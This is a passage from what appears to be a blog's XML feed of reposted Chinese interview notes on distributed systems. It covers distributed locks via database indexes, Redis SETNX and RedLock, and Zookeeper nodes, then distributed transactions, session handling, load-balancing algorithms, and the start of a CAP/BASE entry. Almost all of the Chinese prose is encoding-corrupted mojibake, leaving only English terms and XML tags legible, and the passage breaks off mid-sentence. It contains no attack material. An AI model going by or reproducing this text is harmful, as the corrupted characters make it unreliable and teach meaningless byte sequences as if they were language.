é”æ²¡æœ‰å¤±æ•ˆæ—¶é—´ï¼Œè§£é”å¤±è´¥çš„è¯å…¶ä»–çº¿ç¨‹æ— æ³•å†è·å¾—é”ã€‚ åªèƒ½æ˜¯éé˜»å¡é”ï¼Œæ’å…¥å¤±è´¥ç›´æ¥å°±æŠ¥é”™äº†ï¼Œæ— æ³•é‡è¯•ã€‚ ä¸å¯é‡å…¥ï¼Œå·²ç»è·å¾—é”çš„è¿›ç¨‹ä¹Ÿå¿…é¡»é‡æ–°è·å–é”ã€‚ Redis çš„ SETNX æŒ‡ä»¤ä½¿ç”¨ SETNXï¼ˆset if not existï¼‰æŒ‡ä»¤æ’å…¥ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå¦‚æœ Key å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆä¼šè¿”å› Falseï¼Œå¦åˆ™æ’å…¥æˆåŠŸå¹¶è¿”å› Trueã€‚ SETNX æŒ‡ä»¤å’Œæ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•ç±»ä¼¼ï¼Œå¯ä»¥ä¿è¯åªå­˜åœ¨ä¸€ä¸ª Key çš„é”®å€¼å¯¹ï¼Œå¯ä»¥ç”¨ä¸€ä¸ª Key çš„é”®å€¼å¯¹æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å­˜äºé”å®šçŠ¶æ€ã€‚ EXPIRE æŒ‡ä»¤å¯ä»¥ä¸ºä¸€ä¸ªé”®å€¼å¯¹è®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œä»è€Œé¿å…äº†æ•°æ®åº“å”¯ä¸€ç´¢å¼•å®ç°æ–¹å¼ä¸­é‡Šæ”¾é”å¤±è´¥çš„é—®é¢˜ã€‚ Redis çš„ RedLock ç®—æ³•ä½¿ç”¨äº†å¤šä¸ª Redis å®ä¾‹æ¥å®ç°åˆ†å¸ƒå¼é”ï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯åœ¨å‘ç”Ÿå•ç‚¹æ•…éšœæ—¶ä»ç„¶å¯ç”¨ã€‚ å°è¯•ä» N ä¸ªç›¸äº’ç‹¬ç«‹ Redis å®ä¾‹è·å–é”ï¼Œå¦‚æœä¸€ä¸ªå®ä¾‹ä¸å¯ç”¨ï¼Œåº”è¯¥å°½å¿«å°è¯•ä¸‹ä¸€ä¸ªã€‚ è®¡ç®—è·å–é”æ¶ˆè€—çš„æ—¶é—´ï¼Œåªæœ‰å½“è¿™ä¸ªæ—¶é—´å°äºé”çš„è¿‡æœŸæ—¶é—´ï¼Œå¹¶ä¸”ä»å¤§å¤šæ•°ï¼ˆN/2+1ï¼‰å®ä¾‹ä¸Šè·å–äº†é”ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºé”è·å–æˆåŠŸäº†ã€‚ å¦‚æœé”è·å–å¤±è´¥ï¼Œä¼šåˆ°æ¯ä¸ªå®ä¾‹ä¸Šé‡Šæ”¾é”ã€‚ Zookeeper çš„æœ‰åºèŠ‚ç‚¹1. Zookeeper æŠ½è±¡æ¨¡å‹Zookeeper æä¾›äº†ä¸€ç§æ ‘å½¢ç»“æ„çº§çš„å‘½åç©ºé—´ï¼Œ/app1/p_1 èŠ‚ç‚¹è¡¨ç¤ºå®ƒçš„çˆ¶èŠ‚ç‚¹ä¸º /app1ã€‚ 2. èŠ‚ç‚¹ç±»å‹ æ°¸ä¹…èŠ‚ç‚¹ï¼šä¸ä¼šå› ä¸ºä¼šè¯ç»“æŸæˆ–è€…è¶…æ—¶è€Œæ¶ˆå¤±ï¼› ä¸´æ—¶èŠ‚ç‚¹ï¼šå¦‚æœä¼šè¯ç»“æŸæˆ–è€…è¶…æ—¶å°±ä¼šæ¶ˆå¤±ï¼› æœ‰åºèŠ‚ç‚¹ï¼šä¼šåœ¨èŠ‚ç‚¹åçš„åé¢åŠ ä¸€ä¸ªæ•°å­—åç¼€ï¼Œå¹¶ä¸”æ˜¯æœ‰åºçš„ï¼Œä¾‹å¦‚ç”Ÿæˆçš„æœ‰åºèŠ‚ç‚¹ä¸º /lock/node-0000000000ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ªæœ‰åºèŠ‚ç‚¹åˆ™ä¸º /lock/node-0000000001ï¼Œä»¥æ­¤ç±»æ¨ã€‚ 3. ç›‘å¬å™¨ä¸ºä¸€ä¸ªèŠ‚ç‚¹æ³¨å†Œç›‘å¬å™¨ï¼Œåœ¨èŠ‚ç‚¹çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œä¼šç»™å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ã€‚ 4. åˆ†å¸ƒå¼é”å®ç° åˆ›å»ºä¸€ä¸ªé”ç›®å½• /lockï¼› å½“ä¸€ä¸ªå®¢æˆ·ç«¯éœ€è¦è·å–é”æ—¶ï¼Œåœ¨ /lock ä¸‹åˆ›å»ºä¸´æ—¶çš„ä¸”æœ‰åºçš„å­èŠ‚ç‚¹ï¼› å®¢æˆ·ç«¯è·å– /lock ä¸‹çš„å­èŠ‚ç‚¹åˆ—è¡¨ï¼Œåˆ¤æ–­è‡ªå·±åˆ›å»ºçš„å­èŠ‚ç‚¹æ˜¯å¦ä¸ºå½“å‰å­èŠ‚ç‚¹åˆ—è¡¨ä¸­åºå·æœ€å°çš„å­èŠ‚ç‚¹ï¼Œå¦‚æœæ˜¯åˆ™è®¤ä¸ºè·å¾—é”ï¼›å¦åˆ™ç›‘å¬è‡ªå·±çš„å‰ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œè·å¾—å­èŠ‚ç‚¹çš„å˜æ›´é€šçŸ¥åé‡å¤æ­¤æ­¥éª¤ç›´è‡³è·å¾—é”ï¼› æ‰§è¡Œä¸šåŠ¡ä»£ç ï¼Œå®Œæˆåï¼Œåˆ é™¤å¯¹åº”çš„å­èŠ‚ç‚¹ã€‚ 5. ä¼šè¯è¶…æ—¶å¦‚æœä¸€ä¸ªå·²ç»è·å¾—é”çš„ä¼šè¯è¶…æ—¶äº†ï¼Œå› ä¸ºåˆ›å»ºçš„æ˜¯ä¸´æ—¶èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¯¥ä¼šè¯å¯¹åº”çš„ä¸´æ—¶èŠ‚ç‚¹ä¼šè¢«åˆ é™¤ï¼Œå…¶å®ƒä¼šè¯å°±å¯ä»¥è·å¾—é”äº†ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒZookeeper åˆ†å¸ƒå¼é”ä¸ä¼šå‡ºç°æ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•å®ç°åˆ†å¸ƒå¼é”çš„é‡Šæ”¾é”å¤±è´¥é—®é¢˜ã€‚ 6. ç¾Šç¾¤æ•ˆåº”ä¸€ä¸ªèŠ‚ç‚¹æœªè·å¾—é”ï¼Œéœ€è¦ç›‘å¬è‡ªå·±çš„å‰ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœç›‘å¬æ‰€æœ‰çš„å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆä»»æ„ä¸€ä¸ªå­èŠ‚ç‚¹çŠ¶æ€æ”¹å˜ï¼Œå…¶å®ƒæ‰€æœ‰å­èŠ‚ç‚¹éƒ½ä¼šæ”¶åˆ°é€šçŸ¥ï¼ˆç¾Šç¾¤æ•ˆåº”ï¼‰ï¼Œè€Œæˆ‘ä»¬åªå¸Œæœ›å®ƒçš„åä¸€ä¸ªå­èŠ‚ç‚¹æ”¶åˆ°é€šçŸ¥ã€‚ å‚è€ƒï¼š æµ…è°ˆåˆ†å¸ƒå¼é” Distributed locks with Redis åŸºäº Zookeeper çš„åˆ†å¸ƒå¼é” äºŒã€åˆ†å¸ƒå¼äº‹åŠ¡æŒ‡äº‹åŠ¡çš„æ“ä½œä½äºä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œéœ€è¦ä¿è¯äº‹åŠ¡çš„ AICD ç‰¹æ€§ã€‚ä¾‹å¦‚åœ¨ä¸‹å•åœºæ™¯ä¸‹ï¼Œåº“å­˜å’Œè®¢å•å¦‚æœä¸åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œå°±æ¶‰åŠåˆ†å¸ƒå¼äº‹åŠ¡ã€‚ æœ¬åœ°æ¶ˆæ¯è¡¨1. åŸç†æœ¬åœ°æ¶ˆæ¯è¡¨ä¸ä¸šåŠ¡æ•°æ®è¡¨å¤„äºåŒä¸€ä¸ªæ•°æ®åº“ä¸­ï¼Œè¿™æ ·å°±èƒ½åˆ©ç”¨æœ¬åœ°äº‹åŠ¡æ¥ä¿è¯åœ¨å¯¹è¿™ä¸¤ä¸ªè¡¨çš„æ“ä½œæ»¡è¶³äº‹åŠ¡ç‰¹æ€§ã€‚ åœ¨åˆ†å¸ƒå¼äº‹åŠ¡æ“ä½œçš„ä¸€æ–¹å®Œæˆå†™ä¸šåŠ¡æ•°æ®çš„æ“ä½œä¹‹åå‘æœ¬åœ°æ¶ˆæ¯è¡¨å‘é€ä¸€ä¸ªæ¶ˆæ¯ï¼Œæœ¬åœ°äº‹åŠ¡èƒ½ä¿è¯è¿™ä¸ªæ¶ˆæ¯ä¸€å®šä¼šè¢«å†™å…¥æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­ã€‚ ä¹‹åå°†æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­çš„æ¶ˆæ¯è½¬å‘åˆ° Kafka ç­‰æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMQï¼‰ä¸­ï¼Œå¦‚æœè½¬å‘æˆåŠŸåˆ™å°†æ¶ˆæ¯ä»æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­åˆ é™¤ï¼Œå¦åˆ™ç»§ç»­é‡æ–°è½¬å‘ã€‚ åœ¨åˆ†å¸ƒå¼äº‹åŠ¡æ“ä½œçš„å¦ä¸€æ–¹ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–ä¸€ä¸ªæ¶ˆæ¯ï¼Œå¹¶æ‰§è¡Œæ¶ˆæ¯ä¸­çš„æ“ä½œã€‚ 2. åˆ†ææœ¬åœ°æ¶ˆæ¯è¡¨åˆ©ç”¨äº†æœ¬åœ°äº‹åŠ¡æ¥å®ç°åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå¹¶ä¸”ä½¿ç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—æ¥ä¿è¯æœ€ç»ˆä¸€è‡´æ€§ã€‚ ä¸¤é˜¶æ®µæäº¤åè®®CyC2018/Interview-Notebook/ä¸€è‡´æ€§.md/2PC å‚è€ƒï¼š èŠèŠåˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå†è¯´è¯´è§£å†³æ–¹æ¡ˆ åˆ†å¸ƒå¼ç³»ç»Ÿçš„äº‹åŠ¡å¤„ç† æ·±å…¥ç†è§£åˆ†å¸ƒå¼äº‹åŠ¡ ä¸‰ã€åˆ†å¸ƒå¼ Sessionåœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ï¼Œä¸€ä¸ªç”¨æˆ·çš„ Session å¦‚æœåªå­˜å‚¨åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆå½“è´Ÿè½½å‡è¡¡å™¨æŠŠç”¨æˆ·çš„ä¸‹ä¸€ä¸ªè¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œè¯¥æœåŠ¡å™¨æ²¡æœ‰ç”¨æˆ·çš„ Sessionï¼Œå°±å¯èƒ½å¯¼è‡´ç”¨æˆ·éœ€è¦é‡æ–°è¿›è¡Œç™»å½•ç­‰æ“ä½œã€‚ Sticky Sessionséœ€è¦é…ç½®è´Ÿè½½å‡è¡¡å™¨ï¼Œä½¿å¾—ä¸€ä¸ªç”¨æˆ·çš„æ‰€æœ‰è¯·æ±‚éƒ½è·¯ç”±åˆ°ä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥æŠŠç”¨æˆ·çš„ Session å­˜æ”¾åœ¨è¯¥æœåŠ¡å™¨èŠ‚ç‚¹ä¸­ã€‚ ç¼ºç‚¹ï¼šå½“æœåŠ¡å™¨èŠ‚ç‚¹å®•æœºæ—¶ï¼Œå°†ä¸¢å¤±è¯¥æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šçš„æ‰€æœ‰ Sessionã€‚ Session Replicationåœ¨æœåŠ¡å™¨èŠ‚ç‚¹ä¹‹é—´è¿›è¡Œ Session åŒæ­¥æ“ä½œï¼Œè¿™æ ·çš„è¯ç”¨æˆ·å¯ä»¥è®¿é—®ä»»ä½•ä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ã€‚ ç¼ºç‚¹ï¼šå ç”¨è¿‡å¤šå†…å­˜ï¼›åŒæ­¥è¿‡ç¨‹å ç”¨ç½‘ç»œå¸¦å®½ä»¥åŠæœåŠ¡å™¨å¤„ç†å™¨æ—¶é—´ã€‚ Session Serverä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„æœåŠ¡å™¨å­˜å‚¨ Session æ•°æ®ï¼Œå¯ä»¥å­˜åœ¨ MySQL æ•°æ®åº“ä¸Šï¼Œä¹Ÿå¯ä»¥å­˜åœ¨ Redis æˆ–è€… Memcached è¿™ç§å†…å­˜å‹æ•°æ®åº“ã€‚ ç¼ºç‚¹ï¼šéœ€è¦å»å®ç°å­˜å– Session çš„ä»£ç ã€‚ å‚è€ƒï¼š Session Management using Spring Session with JDBC DataStore å››ã€è´Ÿè½½å‡è¡¡ç®—æ³•1. è½®è¯¢ï¼ˆRound Robinï¼‰è½®è¯¢ç®—æ³•æŠŠæ¯ä¸ªè¯·æ±‚è½®æµå‘é€åˆ°æ¯ä¸ªæœåŠ¡å™¨ä¸Šã€‚ä¸‹å›¾ä¸­ï¼Œä¸€å…±æœ‰ 6 ä¸ªå®¢æˆ·ç«¯äº§ç”Ÿäº† 6 ä¸ªè¯·æ±‚ï¼Œè¿™ 6 ä¸ªè¯·æ±‚æŒ‰ (1, 2, 3, 4, 5, 6) çš„é¡ºåºå‘é€ã€‚æœ€åï¼Œ(1, 3, 5) çš„è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œ(2, 4, 6) çš„è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 2ã€‚ è¯¥ç®—æ³•æ¯”è¾ƒé€‚åˆæ¯ä¸ªæœåŠ¡å™¨çš„æ€§èƒ½å·®ä¸å¤šçš„åœºæ™¯ï¼Œå¦‚æœæœ‰æ€§èƒ½å­˜åœ¨å·®å¼‚çš„æƒ…å†µä¸‹ï¼Œé‚£ä¹ˆæ€§èƒ½è¾ƒå·®çš„æœåŠ¡å™¨å¯èƒ½æ— æ³•æ‰¿æ‹…è¿‡å¤§çš„è´Ÿè½½ï¼ˆä¸‹å›¾çš„ Server 2ï¼‰ã€‚ 2. åŠ æƒè½®è¯¢ï¼ˆWeighted Round Robbinï¼‰åŠ æƒè½®è¯¢æ˜¯åœ¨è½®è¯¢çš„åŸºç¡€ä¸Šï¼Œæ ¹æ®æœåŠ¡å™¨çš„æ€§èƒ½å·®å¼‚ï¼Œä¸ºæœåŠ¡å™¨èµ‹äºˆä¸€å®šçš„æƒå€¼ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒæœåŠ¡å™¨ 1 è¢«èµ‹äºˆçš„æƒå€¼ä¸º 5ï¼ŒæœåŠ¡å™¨ 2 è¢«èµ‹äºˆçš„æƒå€¼ä¸º 1ï¼Œé‚£ä¹ˆ (1, 2, 3, 4, 5) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œ(6) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 2ã€‚ 3. æœ€å°‘è¿æ¥ï¼ˆleast Connectionsï¼‰ç”±äºæ¯ä¸ªè¯·æ±‚çš„è¿æ¥æ—¶é—´ä¸ä¸€æ ·ï¼Œä½¿ç”¨è½®è¯¢æˆ–è€…åŠ æƒè½®è¯¢ç®—æ³•çš„è¯ï¼Œå¯èƒ½ä¼šè®©ä¸€å°æœåŠ¡å™¨å½“å‰è¿æ¥æ•°è¿‡å¤§ï¼Œè€Œå¦ä¸€å°æœåŠ¡å™¨çš„è¿æ¥è¿‡å°ï¼Œé€ æˆè´Ÿè½½ä¸å‡è¡¡ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼Œ(1, 3, 5) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œä½†æ˜¯ (1, 3) å¾ˆå¿«å°±æ–­å¼€è¿æ¥ï¼Œæ­¤æ—¶åªæœ‰ (5) è¯·æ±‚è¿æ¥æœåŠ¡å™¨ 1ï¼›(2, 4, 6) è¯·æ±‚è¢«å‘é€åˆ°æœåŠ¡å™¨ 2ï¼Œåªæœ‰ (2) çš„è¿æ¥æ–­å¼€ã€‚è¯¥ç³»ç»Ÿç»§ç»­è¿è¡Œæ—¶ï¼ŒæœåŠ¡å™¨ 2 ä¼šæ‰¿æ‹…è¿‡å¤§çš„è´Ÿè½½ã€‚ æœ€å°‘è¿æ¥ç®—æ³•å°±æ˜¯å°†è¯·æ±‚å‘é€ç»™å½“å‰æœ€å°‘è¿æ¥æ•°çš„æœåŠ¡å™¨ä¸Šã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒæœåŠ¡å™¨ 1 å½“å‰è¿æ¥æ•°æœ€å°ï¼Œé‚£ä¹ˆæ–°åˆ°æ¥çš„è¯·æ±‚ 6 å°±ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1 ä¸Šã€‚ 4. åŠ æƒæœ€å°‘è¿æ¥ï¼ˆWeighted Least Connectionï¼‰åœ¨æœ€å°‘è¿æ¥çš„åŸºç¡€ä¸Šï¼Œæ ¹æ®æœåŠ¡å™¨çš„æ€§èƒ½ä¸ºæ¯å°æœåŠ¡å™¨åˆ†é…æƒé‡ï¼Œå†æ ¹æ®æƒé‡è®¡ç®—å‡ºæ¯å°æœåŠ¡å™¨èƒ½å¤„ç†çš„è¿æ¥æ•°ã€‚ 5. éšæœºç®—æ³•ï¼ˆRandomï¼‰æŠŠè¯·æ±‚éšæœºå‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚å’Œè½®è¯¢ç®—æ³•ç±»ä¼¼ï¼Œè¯¥ç®—æ³•æ¯”è¾ƒé€‚åˆæœåŠ¡å™¨æ€§èƒ½å·®ä¸å¤šçš„åœºæ™¯ã€‚ 6. æºåœ°å€å“ˆå¸Œæ³• (IP Hash)æºåœ°å€å“ˆå¸Œé€šè¿‡å¯¹å®¢æˆ·ç«¯ IP å“ˆå¸Œè®¡ç®—å¾—åˆ°çš„ä¸€ä¸ªæ•°å€¼ï¼Œç”¨è¯¥æ•°å€¼å¯¹æœåŠ¡å™¨æ•°é‡è¿›è¡Œå–æ¨¡è¿ç®—ï¼Œå–æ¨¡ç»“æœä¾¿æ˜¯ç›®æ ‡æœåŠ¡å™¨çš„åºå·ã€‚ ä¼˜ç‚¹ï¼šä¿è¯åŒä¸€ IP çš„å®¢æˆ·ç«¯éƒ½ä¼šè¢« hash åˆ°åŒä¸€å°æœåŠ¡å™¨ä¸Šã€‚ ç¼ºç‚¹ï¼šä¸åˆ©äºé›†ç¾¤æ‰©å±•ï¼Œåå°æœåŠ¡å™¨æ•°é‡å˜æ›´éƒ½ä¼šå½±å“ hash ç»“æœã€‚å¯ä»¥é‡‡ç”¨ä¸€è‡´æ€§ Hash æ”¹è¿›ã€‚ å®ç°1. HTTP é‡å®šå‘HTTP é‡å®šå‘è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ”¶åˆ° HTTP è¯·æ±‚ä¹‹åä¼šè¿”å›æœåŠ¡å™¨çš„åœ°å€ï¼Œå¹¶å°†è¯¥åœ°å€å†™å…¥ HTTP é‡å®šå‘å“åº”ä¸­è¿”å›ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æ”¶åˆ°åéœ€è¦å†æ¬¡å‘é€è¯·æ±‚ã€‚ ç¼ºç‚¹ï¼š ç”¨æˆ·è®¿é—®çš„å»¶è¿Ÿä¼šå¢åŠ ï¼› å¦‚æœè´Ÿè½½å‡è¡¡å™¨å®•æœºï¼Œå°±æ— æ³•è®¿é—®è¯¥ç«™ç‚¹ã€‚ 2. DNS é‡å®šå‘ä½¿ç”¨ DNS ä½œä¸ºè´Ÿè½½å‡è¡¡å™¨ï¼Œæ ¹æ®è´Ÿè½½æƒ…å†µè¿”å›ä¸åŒæœåŠ¡å™¨çš„ IP åœ°å€ã€‚å¤§å‹ç½‘ç«™åŸºæœ¬ä½¿ç”¨äº†è¿™ç§æ–¹å¼åšä¸ºç¬¬ä¸€çº§è´Ÿè½½å‡è¡¡æ‰‹æ®µï¼Œç„¶ååœ¨å†…éƒ¨ä½¿ç”¨å…¶å®ƒæ–¹å¼åšç¬¬äºŒçº§è´Ÿè½½å‡è¡¡ã€‚ ç¼ºç‚¹ï¼š DNS æŸ¥æ‰¾è¡¨å¯èƒ½ä¼šè¢«å®¢æˆ·ç«¯ç¼“å­˜èµ·æ¥ï¼Œé‚£ä¹ˆä¹‹åçš„æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«é‡å®šå‘åˆ°åŒä¸€ä¸ªæœåŠ¡å™¨ã€‚ 3. ä¿®æ”¹ MAC åœ°å€ä½¿ç”¨ LVSï¼ˆLinux Virtual Serverï¼‰è¿™ç§é“¾è·¯å±‚è´Ÿè½½å‡è¡¡å™¨ï¼Œæ ¹æ®è´Ÿè½½æƒ…å†µä¿®æ”¹è¯·æ±‚çš„ MAC åœ°å€ã€‚ 4. ä¿®æ”¹ IP åœ°å€åœ¨ç½‘ç»œå±‚ä¿®æ”¹è¯·æ±‚çš„ç›®çš„ IP åœ°å€ã€‚ 5. ä»£ç†è‡ªåŠ¨é…ç½®æ­£å‘ä»£ç†ä¸åå‘ä»£ç†çš„åŒºåˆ«ï¼š æ­£å‘ä»£ç†ï¼šå‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œæ˜¯ç”±ç”¨æˆ·ä¸»åŠ¨å‘èµ·çš„ã€‚æ¯”å¦‚ç¿»å¢™ï¼Œå®¢æˆ·ç«¯é€šè¿‡ä¸»åŠ¨è®¿é—®ä»£ç†æœåŠ¡å™¨ï¼Œè®©ä»£ç†æœåŠ¡å™¨è·å¾—éœ€è¦çš„å¤–ç½‘æ•°æ®ï¼Œç„¶åè½¬å‘å›å®¢æˆ·ç«¯ã€‚ åå‘ä»£ç†ï¼šå‘ç”Ÿåœ¨æœåŠ¡å™¨ç«¯ï¼Œç”¨æˆ·ä¸çŸ¥é“ä»£ç†çš„å­˜åœ¨ã€‚ PAC æœåŠ¡å™¨æ˜¯ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªè¯·æ±‚æ˜¯å¦è¦ç»è¿‡ä»£ç†ã€‚ å‚è€ƒï¼š Comparing Load Balancing Algorithms è´Ÿè½½å‡è¡¡ç®—æ³•åŠæ‰‹æ®µ Redirection and Load Balancing]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸€è‡´æ€§]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E4%B8%80%E8%87%B4%E6%80%A7%2F</url>
    <content type="text"><![CDATA[ä¸€ã€CAP ä¸€è‡´æ€§ å¯ç”¨æ€§ åˆ†åŒºå®¹å¿æ€§ æƒè¡¡ äºŒã€BASE åŸºæœ¬å¯ç”¨ è½¯çŠ¶æ€ æœ€ç»ˆä¸€è‡´æ€§ ä¸‰ã€2PC è¿è¡Œè¿‡ç¨‹ å­˜åœ¨çš„é—®é¢˜ å››ã€Paxos æ‰§è¡Œè¿‡ç¨‹ çº¦æŸæ¡ä»¶ äº”ã€Raft å•ä¸ª Candidate çš„ç«é€‰ å¤šä¸ª Candidate ç«é€‰ æ—¥å¿—å¤åˆ¶ å‚è€ƒèµ„æ–™ ä¸€ã€CAPåˆ†å¸ƒå¼ç³»ç»Ÿä¸å¯èƒ½åŒæ—¶æ»¡è¶³ä¸€è‡´æ€§ï¼ˆCï¼šConsistencyï¼‰ã€å¯ç”¨æ€§ï¼ˆAï¼šAvailabilityï¼‰å’Œåˆ†åŒºå®¹å¿æ€§ï¼ˆPï¼šPartition Toleranceï¼‰ï¼Œæœ€å¤šåªèƒ½åŒæ—¶æ»¡è¶³å…¶ä¸­ä¸¤é¡¹ã€‚ ä¸€è‡´æ€§ä¸€è‡´æ€§æŒ‡çš„æ˜¯å¤šä¸ªæ•°æ®å‰¯æœ¬æ˜¯å¦èƒ½ä¿æŒä¸€è‡´çš„ç‰¹æ€§ã€‚ åœ¨ä¸€è‡´æ€§çš„æ¡ä»¶ä¸‹ï¼Œç³»ç»Ÿåœ¨æ‰§è¡Œæ•°æ®æ›´æ–°æ“ä½œä¹‹åèƒ½å¤Ÿä»ä¸€è‡´æ€§çŠ¶æ€è½¬ç§»åˆ°å¦ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€ã€‚ å¯¹ç³»ç»Ÿçš„ä¸€ä¸ªæ•°æ®æ›´æ–°æˆåŠŸä¹‹åï¼Œå¦‚æœæ‰€æœ‰ç”¨æˆ·éƒ½èƒ½å¤Ÿè¯»å–åˆ°æœ€æ–°çš„å€¼ï¼Œè¯¥ç³»ç»Ÿå°±è¢«è®¤ä¸ºå…·æœ‰å¼ºä¸€è‡´æ€§ã€‚ å¯ç”¨æ€§å¯ç”¨æ€§æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨é¢å¯¹å„ç§å¼‚å¸¸æ—¶å¯ä»¥æä¾›æ­£å¸¸æœåŠ¡çš„èƒ½åŠ›ï¼Œå¯ä»¥ç”¨ç³»ç»Ÿå¯ç”¨æ—¶é—´å æ€»æ—¶é—´çš„æ¯”å€¼æ¥è¡¡é‡ï¼Œ4 ä¸ª 9 çš„å¯ç”¨æ€§è¡¨ç¤ºç³»ç»Ÿ 99.99% çš„æ—¶é—´æ˜¯å¯ç”¨çš„ã€‚ åœ¨å¯ç”¨æ€§æ¡ä»¶ä¸‹ï¼Œç³»ç»Ÿæä¾›çš„æœåŠ¡ä¸€ç›´å¤„äºå¯ç”¨çš„çŠ¶æ€ï¼Œå¯¹äºç”¨æˆ·çš„æ¯ä¸€ä¸ªæ“ä½œè¯·æ±‚æ€»æ˜¯èƒ½å¤Ÿåœ¨æœ‰é™çš„æ—¶é—´å†…è¿”å›ç»“æœã€‚ åˆ†åŒºå®¹å¿æ€§ç½‘ç»œåˆ†åŒºæŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹è¢«åˆ’åˆ†ä¸ºå¤šä¸ªåŒºåŸŸï¼Œæ¯ä¸ªåŒºåŸŸå†…éƒ¨å¯ä»¥é€šä¿¡ï¼Œä½†æ˜¯åŒºåŸŸä¹‹é—´æ— æ³•é€šä¿¡ã€‚ åœ¨åˆ†åŒºå®¹å¿æ€§æ¡ä»¶ä¸‹ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿåœ¨é‡åˆ°ä»»ä½•ç½‘ç»œåˆ†åŒºæ•…éšœçš„æ—¶å€™ï¼Œä»ç„¶éœ€è¦èƒ½å¯¹å¤–æä¾›ä¸€è‡´æ€§å’Œå¯ç”¨æ€§çš„æœåŠ¡ï¼Œé™¤éæ˜¯æ•´ä¸ªç½‘ç»œç¯å¢ƒéƒ½å‘ç”Ÿäº†æ•…éšœã€‚ æƒè¡¡åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œåˆ†åŒºå®¹å¿æ€§å¿…ä¸å¯å°‘ï¼Œå› ä¸ºéœ€è¦æ€»æ˜¯å‡è®¾ç½‘ç»œæ˜¯ä¸å¯é çš„ã€‚å› æ­¤ï¼ŒCAP ç†è®ºå®é™…åœ¨æ˜¯è¦åœ¨å¯ç”¨æ€§å’Œä¸€è‡´æ€§ä¹‹é—´åšæƒè¡¡ã€‚ å¯ç”¨æ€§å’Œä¸€è‡´æ€§å¾€å¾€æ˜¯å†²çªçš„ï¼Œå¾ˆéš¾éƒ½ä½¿å®ƒä»¬åŒæ—¶æ»¡è¶³ã€‚åœ¨å¤šä¸ªèŠ‚ç‚¹ä¹‹é—´è¿›è¡Œæ•°æ®åŒæ­¥æ—¶ï¼Œ ä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼ˆCPï¼‰ï¼Œå°±éœ€è¦è®©æ‰€æœ‰èŠ‚ç‚¹ä¸‹çº¿æˆä¸ºä¸å¯ç”¨çš„çŠ¶æ€ï¼Œç­‰å¾…åŒæ­¥å®Œæˆï¼› ä¸ºäº†ä¿è¯å¯ç”¨æ€§ï¼ˆAPï¼‰ï¼Œåœ¨åŒæ­¥è¿‡ç¨‹ä¸­å…è®¸è¯»å–æ‰€æœ‰èŠ‚ç‚¹çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®å¯èƒ½ä¸ä¸€è‡´ã€‚ äºŒã€BASEBASE æ˜¯åŸºæœ¬å¯ç”¨ï¼ˆBasically Availableï¼‰ã€è½¯çŠ¶æ€ï¼ˆSoft 